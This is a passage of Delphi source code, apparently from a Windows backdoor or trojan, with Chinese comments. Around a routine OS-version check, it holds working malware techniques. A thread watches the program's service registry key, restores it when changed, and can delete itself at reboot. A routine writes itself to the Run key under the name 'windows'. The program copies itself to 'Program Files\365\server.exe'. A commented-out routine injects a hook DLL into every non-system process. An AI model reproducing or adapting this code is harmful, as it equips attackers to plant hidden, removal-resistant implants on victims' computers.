        result:='Microsoft Windows 2000 ';
      if (osvi.dwMajorVersion<= 4 ) then
        result:='Microsoft Windows NT ';
         // Test for specific product on Windows NT 4.0 SP6 and later.
      if( bOsVersionInfoEx ) then
      begin
        // Test for the workstation type.
        if ( osvi.wProductType = VER_NT_WORKSTATION ) then
        begin
          if( osvi.dwMajorVersion = 4 ) then
            result:=result+'Workstation 4.0 '
          else if( osvi.wSuiteMask and VER_SUITE_PERSONAL )=VER_SUITE_PERSONAL then
            result:=result+'Home Edition '
          else
            result:=result+'Professional ';
        end
        // Test for the server type.
        else if ( osvi.wProductType = VER_NT_SERVER ) then
        begin
          if( osvi.dwMajorVersion = 5 )and( osvi.dwMinorVersion = 2 ) then
          begin
            if( osvi.wSuiteMask and VER_SUITE_DATACENTER )=VER_SUITE_DATACENTER then
              result:=result+'Datacenter Edition '
            else if( osvi.wSuiteMask and VER_SUITE_ENTERPRISE )=VER_SUITE_ENTERPRISE then
              result:=result+'Enterprise Edition '
            else if ( osvi.wSuiteMask = VER_SUITE_BLADE ) then
              result:=result+'Web Edition '
            else
              result:=result+'Standard Edition ';
          end//if( osvi.dwMajorVersion = 5 )and( osvi.dwMinorVersion = 2 ) then
          else if( osvi.dwMajorVersion = 5 )and( osvi.dwMinorVersion = 0 ) then
          begin
            if( osvi.wSuiteMask and VER_SUITE_DATACENTER )=VER_SUITE_DATACENTER then
              result:=result+'Datacenter Server '
            else if( osvi.wSuiteMask and VER_SUITE_ENTERPRISE )=VER_SUITE_ENTERPRISE then
              result:=result+'Advanced Server '
            else
              result:=result+'Server ';
          end//else if( osvi.dwMajorVersion = 5 )and( osvi.dwMinorVersion == 0 ) then
          else  begin// Windows NT 4.0
            if( osvi.wSuiteMask and VER_SUITE_ENTERPRISE )=VER_SUITE_ENTERPRISE then
              result:=result+'Server 4.0, Enterprise Edition '
            else
              result:=result+'Server 4.0 ';
          end//Windows NT 4.0
        end;//else if ( osvi.wProductType = VER_NT_SERVER ) then
      end//if( bOsVersionInfoEx ) then
      else  begin// Test for specific product on Windows NT 4.0 SP5 and earlier
        lRet := RegOpenKeyEx( HKEY_LOCAL_MACHINE,
               'SYSTEM\CurrentControlSet\Control\ProductOptions',
               0, KEY_QUERY_VALUE,hK);
        if( lRet <> ERROR_SUCCESS ) then exit;
        dwBufLen:=BUFSIZE;
        lRet := RegQueryValueEx( hK, 'ProductType', nil, nil,
               PBYTE(@szProductType),@dwBufLen);
        if( (lRet <> ERROR_SUCCESS) or (dwBufLen > BUFSIZE) ) then exit;
        RegCloseKey( hK );
        if ( lstrcmpia( 'WINNT', szProductType) = 0 ) then
          result:=result+'Workstation ';
        if ( lstrcmpiA( 'LANMANNT', szProductType) = 0 ) then
          result:=result+'Server ';
        if ( lstrcmpiA( 'SERVERNT', szProductType) = 0 ) then
          result:=result+'Advanced Server ';
        _wsprintf(szProductType,'%d.%d ',[osvi.dwMajorVersion, osvi.dwMinorVersion]);
        result:=result+szProductType;
      end;//    // Test for specific product on Windows NT 4.0 SP5 and earlier
      // Display service pack (if any) and build number.
      if( osvi.dwMajorVersion = 4) and
             (lstrcmpiA( osvi.szCSDVersion, 'Service Pack 6' ) = 0 ) then
      begin
        // Test for SP6 versus SP6a.
        lRet := RegOpenKeyEx( HKEY_LOCAL_MACHINE,
            'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Hotfix\Q246009',
            0, KEY_QUERY_VALUE, hK);
        if( lRet = ERROR_SUCCESS ) then
        begin
           _wsprintf(szProductType,'Service Pack 6a (Build %d)', [osvi.dwBuildNumber and $FFFF] );
          result:=result+szProductType;
        end
        else begin// Windows NT 4.0 prior to SP6a
          _wsprintf(szProductType,'%s (Build %d)',[osvi.szCSDVersion,osvi.dwBuildNumber and $FFFF]);
          result:=result+szProductType;
        end;//      Windows NT 4.0 prior to SP6a
        RegCloseKey( hK );
      end// Display service pack (if any) and build number.
      else begin// Windows NT 3.51 and earlier or Windows 2000 and later
        _wsprintf(szProductType,'%s (Build %d)',[osvi.szCSDVersion,osvi.dwBuildNumber and $FFFF]);
        result:=result+szProductType;

      end;
    end;//VER_PLATFORM_WIN32_NT:
    // Test for the Windows 95 product family.
    VER_PLATFORM_WIN32_WINDOWS:
    begin
      if (osvi.dwMajorVersion = 4) and (osvi.dwMinorVersion = 0) then
      begin
        result:=result+'Microsoft Windows 95: ';
        if ( osvi.szCSDVersion[1] = 'C' ) or ( osvi.szCSDVersion[1] = 'B' ) then
          result:=result+'OSR2 ';
      end;//if (osvi.dwMajorVersion = 4) and (osvi.dwMinorVersion = 0) then
      if (osvi.dwMajorVersion = 4) and (osvi.dwMinorVersion = 10) then
      begin
        result:=result+'Microsoft Windows 98: ';
        if ( osvi.szCSDVersion[1] = 'A' ) then
          result:=result+'SE ';
      end;//if (osvi.dwMajorVersion = 4) and (osvi.dwMinorVersion = 10) then
      if (osvi.dwMajorVersion = 4) and (osvi.dwMinorVersion = 90) then
      begin
        result:=result+'Microsoft Windows Millennium Edition: ';
      end;//if (osvi.dwMajorVersion = 4) and (osvi.dwMinorVersion = 90) then
    end;//VER_PLATFORM_WIN32_WINDOWS:
    VER_PLATFORM_WIN32s:
    begin
      result:=result+'Microsoft Win32s';
    end;//VER_PLATFORM_WIN32s:
  end;//case
  FreeLibrary(DLL);
end;

function SvcProtectThread():bool;stdcall;
var
  hk,pk:HKEY;
  dwFilter:cardinal;
  key,FileName,SystemDir:array[0..max_path-1] of ansiChar;
  str:array[0..31] of ansiChar;
  psm:PShareMemOfProcess;
  svcName:pansiChar;
  mask:DWORD;
  err:integer;
begin
    result:=false;hk:=0;pk:=0;FileName:='';psm:=sm.lpMapAddress;svcName:=sm.keys;
    mask:=0;
    case sm.ProcessType of
      F_Svchost:mask:=Svchost_Update_Mask;
      //F_Iexplore_service:mask:=Iexplore_Update_Mask;
      //F_Iexplore_server:mask:=Iexplore_Update_Mask;
      //F_bc_service:mask:=bc_Update_Mask;
      else mask:=Svchost_Update_Mask;
    end;//case
    dwFilter:=REG_NOTIFY_CHANGE_NAME or REG_NOTIFY_CHANGE_ATTRIBUTES or
              REG_NOTIFY_CHANGE_LAST_SET or REG_NOTIFY_CHANGE_SECURITY;
  try
    hNotify := CreateEvent( nil,false,TRUE,nil);
    if hNotify = 0 then exit;
    
    lstrcpya(key,'SYSTEM\CurrentControlSet\Services\');lstrcatA(key,svcName);

    err:=RegOpenKeyExA(HKEY_LOCAL_MACHINE,key,0,KEY_ALL_ACCESS,hk);
    if err<>ERROR_SUCCESS then exit;
    err:=RegOpenKeyExA(HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services',0,KEY_ALL_ACCESS,pk);
    if err<>ERROR_SUCCESS then exit;
    //备份:
    err:=GetSystemDirectoryA(SystemDir,sizeof(SystemDir));if err=0 then exit;
    strFromTime(str);lstrcpyA(FileName,Systemdir);lstrcatA(FileName,'\');lstrcatA(FileName,str);
    //备份
    err:=RegSaveKeyA(hk,FileName,nil);
    if err<>ERROR_SUCCESS then exit;
    //监视
    while true do
    begin
      err:=RegNotifyChangeKeyValue(hk,true,dwFilter,hNotify,true);
      if err<>ERROR_SUCCESS then exit;
      WaitForSingleObject( hNotify, infinite);
      if psm^.flag and mask>0 then
      begin
        //卸载操作
        DisableSvc(svcName); //禁用服务
        windows.DeleteFileA(FileName);//删除注册表备份
        if GetModuleFileNameA(hInstance,FileName,max_path)>0 then
          MoveFileExA(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);//删除自身
        lstrcpyA(FileName,SystemDir);lstrcatA(FileName,'\');lstrcatA(FileName,sm.hook);
        MoveFileExA(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);  //删除hook
        //删除共享内存中的信息
        psm^.PIDs[byte(sm.ProcessType)]:=0;
        zeromemory(@(psm^.Files[byte(sm.ProcessType)][0]),sizeof(psm^.Files[byte(sm.ProcessType)]));
        zeromemory(@(psm^.keys[byte(sm.ProcessType)][0]),sizeof(psm^.keys[byte(sm.ProcessType)]));
        psm^.flag:=psm^.flag xor mask;//恢复更新标志
        exit;
      end;
      //恢复:重新打开
      RegCloseKey(hk);
      err:=RegCreateKeyExA(pk,svcName,0,nil,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,nil,hk,nil);
      if err<>ERROR_SUCCESS then exit;
      //恢复
      err:=RegRestoreKeyA(hk,FileName,8);
      if err=ERROR_SUCCESS then result:=true;
    end;//while true do
  finally
    if hk<>0 then RegCloseKey(hk);
    if pk<>0 then RegCloseKey(pk);
    if FileName<>'' then windows.DeleteFileA(FileName);
    SetEvent(hNotify);
  end;//finally
end;

procedure SvcProtect();
//06-8-13
var
  id,hd:cardinal;
begin
  hd:=CreateThread(nil,0,@SvcProtectThread,nil,0,id);
  CloseHandle(hd);
end;

function NBGetAdapterAddress(addr:pansiChar;key:byte=1):bool;
const
  NUM=0;
var
  NCB : TNCB; // Netbios control block file://NetBios控制块
  ADAPTER : TADAPTERSTATUS; // Netbios adapter status//取网卡状态
  LANAENUM : TLANAENUM; // Netbios lana
  cRC : ansiChar; // Netbios return code//NetBios返回值
  i:integer;
begin
  // Initialize
  Result:=false;
  Try
    // Zero control blocl
    ZeroMemory(@NCB, SizeOf(NCB));
    
    // Issue enum command
    NCB.ncb_command := Chr(NCBENUM);
    //cRC := NetBios(@NCB);
    NetBios(@NCB);

    // Reissue enum command
    NCB.ncb_buffer := @LANAENUM;
    NCB.ncb_length := SizeOf(LANAENUM);
    cRC := NetBios(@NCB);
    if Ord(cRC)<>0 Then exit;

    // Reset adapter
    ZeroMemory(@NCB, SizeOf(NCB));
    NCB.ncb_command := Chr(NCBRESET);
    NCB.ncb_lana_num := LANAENUM.lana[NUM];
    cRC := NetBios(@NCB);
    If Ord(cRC)<>0 Then exit;

    // Get adapter address
    ZeroMemory(@NCB, SizeOf(NCB));
    NCB.ncb_command := Chr(NCBASTAT);
    NCB.ncb_lana_num := LANAENUM.lana[NUM];
    lstrcpyA(NCB.ncb_callname, '*');
    NCB.ncb_buffer := @ADAPTER;
    NCB.ncb_length := SizeOf(ADAPTER);
    //cRC := NetBios(@NCB);
    NetBios(@NCB);
    //xor
    for i:=0 to 5 do
     addr[i]:=ansiChar(ord(ADAPTER.adapter_address[i]) xor KEY);
    result:=true;
  finally
    if result=false then
    begin
      lstrcpyA(addr,'123456');
      for i:=0 to 5 do
        addr[i]:=ansiChar(ord(addr[i]) xor KEY);
    end;
  end;
End;

function InitShareMem(var sm:stShareMem;svcName,hookFilename:pansiChar):bool;
var
  me:array[0..max_path-1] of ansiChar;
  p:pansiChar;
begin
  result:=false;
  zeromemory(@sm,sizeof(sm));
  sm.ProcessType:=F_Svchost;
  sm.version:=1001;
  sm.PID:=GetCurrentProcessID();
  if GetModuleFileNameA(SysInit.HInstance,me,max_path)=0 then exit;
  p:=exTractFileName(me);
  strcopy(sm.Files,p);
  if svcname<>nil then lstrcpyA(sm.keys,svcName);
  if lstrlenA(sm.keys)>0 then
  begin
    p:=@sm.keys[0];p:=p+lstrlenA(sm.keys)+1;lstrcpyA(p,'byc');
  end;
  if hookFilename<>nil then lstrcpyA(sm.hook,hookFilename);
  result:=true;
end;

function CreateShareMem(var sm:stShareMem):tShareMemResult;
//2006-08-13
//1、创建内存；2、登记PID；3；只运行一个进程判断
//result:0:失败；1：成功；2：已创建内存；3：已经存在服务
//难点：1、进程意外终止；2、系统进程被隐藏；3、新增进程;
const
  MAX_SIZE=640*1024;
var
  MappingName:array[0..6] of ansiChar;
  psm:PShareMemOfProcess;
  err:cardinal;
begin
  result:=F_False;MappingName:='';
  try
    NBGetAdapterAddress(MappingName);
    sm.hMap:= CreateFileMappingA(INVALID_HANDLE_VALUE,nil,PAGE_READWRITE,0,MAX_SIZE,MappingName);
    if sm.hMap=0 then exit;
    err:=GetLastError();
    sm.lpMapAddress:=MapViewOfFile(sm.hMap,FILE_MAP_ALL_ACCESS,0,0,0);
    if sm.lpMapAddress=nil then exit;
    psm:=PShareMemOfProcess(sm.lpMapAddress);
    if err=ERROR_ALREADY_EXISTS then
    begin
      if (psm^.PIDs[byte(sm.ProcessType)]>0)and(OpenProcess(PROCESS_ALL_ACCESS,false,psm^.PIDs[byte(sm.ProcessType)])>0) then
      begin
        result:=F_FatherCreate;
        exit;
      end else result:=F_OtherCreate;
    end
    else begin
      psm^.version:=1001;
      psm^.size:=sizeof(stShareMemOfProcess);
      result:=F_New;
    end;
    psm^.PIDs[byte(sm.ProcessType)]:=GetCurrentProcessID();
    copymemory(@(psm^.Files[byte(sm.ProcessType)][0]),@sm.files[0],sizeof(sm.Files));
    copymemory(@(psm^.keys[byte(sm.ProcessType)][0]),@sm.keys[0],sizeof(sm.keys));

    if lstrlenA(sm.hook)>0 then
      lstrcpyA(psm^.Files[31],sm.hook);
  finally
  end;
end;
function FreeShareMem(var sm:stShareMem):BOOL;
var
  psm:PShareMemOfProcess;
begin
  sleep(6000);
  psm:=PShareMemOfProcess(sm.lpMapAddress);
  if psm<>nil then psm^.PIDs[byte(sm.ProcessType)]:=0;
  if sm.lpMapAddress<>nil then UnmapViewOfFile(sm.lpMapAddress);
  if sm.hMap<>0 then Closehandle(sm.hMap);
  sm.lpMapAddress:=nil;sm.hMap:=0;

end;
function GetHookNameFromSvcFile(hookFileName,svcFileName:pansiChar):BOOL;
var
  hFile,FileMapping:cardinal;
  DosHeader: PIMAGE_DOS_HEADER;
  p:pansiChar;
  FileBase: Pointer;
begin
  result:=false;
  FileBase:=nil;//hFile:=INVALID_HANDLE_VALUE;FileMapping:=0;
try
  hFile:=createfileA(svcFileName,GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,
         FILE_ATTRIBUTE_NORMAL,0);
  if hFile=INVALID_HANDLE_VALUE then exit;
  FileMapping := CreateFileMapping(hFile, nil, PAGE_READONLY, 0, 0, nil);
  if FileMapping = 0 then exit;
  FileBase := MapViewOfFile(FileMapping, FILE_MAP_READ, 0, 0, 0);
  if FileBase = nil then exit;
  DosHeader := PIMAGE_DOS_HEADER(FileBase);
  if not DosHeader.e_magic = IMAGE_DOS_SIGNATURE then exit;
  p:=pansiChar(FileBase);p:=p+sizeof(IMAGE_DOS_HEADER);
  strcopy(hookFileName,p);
  result:=true;
finally
  if FileBase<>nil then
    UnmapViewOfFile(FileBase);
  if FileMapping<>0 then
    CloseHandle(FileMapping);
  if hFile <> INVALID_HANDLE_VALUE then
    CloseHandle(hFile);
end;//try
end;
{
function IsSystemProcess(FileName:pansiChar):bool;
const
  sysprocs:pansiChar='system;smss;csrss;winlogon;services;lsass;'+
  'svchost;spoolsv;msdtc;conime;wmiprvse;ctfmon;iexplore;devenv;inetinfo';
var
  temp:array[0..max_path-1] of ansiChar;
  p:pansiChar;
  L,i:integer;
begin
  result:=false;
try
  if FileName=nil then exit;
  lstrcpy(temp,FileName);
  L:=lstrlen(temp);if L<=0 then exit;
  p:=@temp[L-1];
  for i:=L-1 downto 0 do
  begin
    if (p^>= 'A') and (p^<= 'Z') then inc(p^, 32);
    if(p^='.') then p^:=#0;
    if(p^='\') then break;
    dec(p);
  end;
  inc(p);
  if pos(p,sysprocs)>0 then result:=true;
finally
end;
end;


function InjectUserProcess(var PIDS:array of stPID):bool;stdcall;
var
  ProcessHandle: THandle;
  Process32: TProcessEntry32;
  ProcessSnapshot: THandle;
  p:pansiChar;
  Filename:array[0..max_path-1] of ansiChar;
  psm:PShareMemOfProcess;
  i,j,len:integer;
  bExit:bool;
begin
  result:=false;ProcessSnapshot:=0;ProcessHandle:=0;
  psm:=PShareMemOfProcess(sm.lpMapAddress);
  p:=psm^.Files[31];
  if (p=nil)or(lstrlen(p)<=0) then exit;
try
  if GetSystemDirectory(Filename,max_path)<=0 then exit;
  lstrcat(Filename,'\');lstrcat(Filename,p);
  if not Fileexist(FileName) then exit;
  ProcessSnapshot := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if ProcessSnapshot=0 then exit;
  Process32.dwSize := SizeOf(TProcessEntry32);
  if not Process32First(ProcessSnapshot, Process32) then exit;

  //置PIDS为未处理
  len:=high(PIDS)+1;
  if len>0 then
  for i:=0 to len-1 do
  begin
    PIDS[i].process:=false;
    sleep(0);
  end;//for
  repeat
    if Process32.th32ProcessID=0 then continue;
    //PID存在PIDS否？
    bExit:=false;
    if len>0 then
    for i:=0 to len-1 do
    begin
      if Process32.th32ProcessID=PIDS[i].PID then  //存在
      begin
        PIDS[i].process:=true;
        bExit:=true;
        break;
      end;//if Process32.th32ProcessID=PIDS[i].PID then
      sleep(0);
    end;//for(i=low(PIDS) to high(PIDS) do
    if bExit then  //已经存在
    begin
      continue;
    end
    else begin     //未处理过
      //分配一内存区
      j:=-1;
      if len>0 then
      for i:=0 to len-1 do
      begin
        if PIDS[i].PID=0 then
        begin
          j:=i;
          break;
        end; // if PIDS[i].PID=0 then
      end;//for(i=0 to len-1) do
      if j=-1 then
      begin
        //j:=len;
        //len:=len+1;
        //setlength(PIDS,len);
        continue;
      end;//if j=-1 then
      //系统
      if IsSystemProcess(Process32.szExeFile)=true then
      begin
        PIDS[j].PID:=Process32.th32ProcessID;
        PIDS[j].Flag:=PID_Sys;
        PIDS[j].process:=true;
        continue;
      end;//if IsSystemProcess(Process32.szExeFile)=true then
      //MYPID
      if IsId(Process32.th32ProcessID,psm)=true then
      begin
        PIDS[j].PID:=Process32.th32ProcessID;
        PIDS[j].Flag:=PID_My;
        PIDS[j].process:=true;
        continue;
      end;//if IsId(Process32.th32ProcessID,psm)=false then
      //打开
      ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, Process32.th32ProcessID);
      if ProcessHandle=0 then
      begin
        PIDS[j].PID:=Process32.th32ProcessID;
        PIDS[j].Flag:=PID_Open_F;
        PIDS[j].process:=true;
        continue;
      end;//if ProcessHandle=0 then
      //注入
      if AttachToProcess(ProcessHandle, FileName)>0 then
      begin
        PIDS[j].PID:=Process32.th32ProcessID;
        PIDS[j].Flag:=PID_Inj_T;
        PIDS[j].process:=true;
      end
      else begin
        PIDS[j].PID:=Process32.th32ProcessID;
        PIDS[j].Flag:=PID_Inj_F;
        PIDS[j].process:=true;
      end;
      if ProcessHandle>0 then
      begin
        CloseHandle(ProcessHandle);
        ProcessHandle:=0;
      end;//if ProcessHandle>0 then
    end;// if not bExit then
    sleep(0);
  until not (Process32Next(ProcessSnapshot, Process32));
  //置PID_Exit
  if len>0 then
  for i:=0 to len-1 do
  begin
    if PIDS[i].process=false then
    begin
      PIDS[i].Flag:=PID_Exit;
      PIDS[i].PID:=0;
    end;//if PIDS[i].process=false then
    sleep(0);
  end;//for(i=low(PIDS) to high(PIDS) do
  result:=true;
finally
  if ProcessSnapshot<>0 then CloseHandle(ProcessSnapshot);
end;
end;

function IsId(Id: dword;psm:PShareMemOfProcess): boolean;
//判断进程是否是我们的
var
  i:integer;
begin
  result:=true;
  for i:=0 to high(psm^.PIDs) do
  begin
    if psm^.PIDs[i]=0 then continue;
    if Id=psm^.PIDs[i] then exit;
  end;
  result:=false;
end;
function InjectUserProcessThread():bool;stdcall;
const
  MAX_PID_COUNT=255;
var
  psm:PShareMemOfProcess;
  PIDS:array[0..MAX_PID_COUNT-1] of stPID;
begin
  result:=false;
  zeromemory(@PIDS[0],sizeof(PIDS));
try
  while true do
  begin
    if not active then exit;
    InjectUserProcess(PIDS);
    sleep(1000);
  end;
  result:=true;
finally
  psm:=PShareMemOfProcess(sm.lpMapAddress);
  if psm<>nil then
    psm^.flag:=psm^.flag xor Hook_Install_Mask;
end;
end;
}
{
procedure InjectUser();
var
  //id,hd:cardinal;
  psm:PShareMemOfProcess;
  p:pansiChar;
  Filename:array[0..max_path-1] of ansiChar;
begin
  psm:=PShareMemOfProcess(sm.lpMapAddress);
  if psm^.flag and Hook_Install_Mask>0 then exit;

  p:=psm^.Files[31];
  if (p=nil)or(lstrlenA(p)<=0) then exit;
  if GetSystemDirectory(Filename,max_path)<=0 then exit;
  lstrcat(Filename,'\');lstrcat(Filename,p);
  if not Fileexist(FileName) then exit;
  if InjectLibrary((ALL_SESSIONS) and (not CURRENT_PROCESS),FileName) then
  //hd:=createthread(nil,0,@InjectUserProcessThread,nil,0,id);
  //closehandle(hd);
  psm^.flag:=psm^.flag xor Hook_Install_Mask;
end;
}
function regSelf():BOOL;
var
  hK:HKEY;
  lpSubKey:LPCSTR;
  MyName:array[0..MAX_PATH] of ansiChar;
  lRet:integer;
begin
  result:=false;
  lpSubKey:='SOFTWARE\Microsoft\Windows\CurrentVersion\Run';

	GetModuleFileNameA(0,MyName,MAX_PATH);

	lRet:=RegOpenKeyExA(HKEY_LOCAL_MACHINE,lpSubKey,0,KEY_ALL_ACCESS,hK);
	if( lRet <> ERROR_SUCCESS ) then exit;

  lRet :=RegSetValueEx(hK,'windows',0,REG_SZ,PByte(@MyName[0]),strlen(MyName));
  if (lRet = ERROR_SUCCESS) then result:=true;
	RegCloseKey( hK );
end;
function MySetup():BOOL;
const
  conRunName:pansiChar='C:\Program Files\365\server.exe';
  conRunDir:pansiChar='C:\Program Files\365';
var
  me:array[0..max_path-1] of ansiChar;
begin
  GetModuleFileNameA(hInstance,me,sizeof(me));
  if StrIComp(conRunName,me)=0 then
  begin
    result:=true;
    exit;
  end
  else begin
    CreateDirectoryA(conRunDir,nil);
    CopyFileA(me,conRunName,false);
    RunFile(conRunName,sw_show);
    result:=false;
    exit;
  end;//if conRunName=me then
end;
begin
 SetErrorMode(SEM_NOGPFAULTERRORBOX);//06-07-08
 OSVersion:=GetOSVerion();
 GetMyPriviliges;

end.

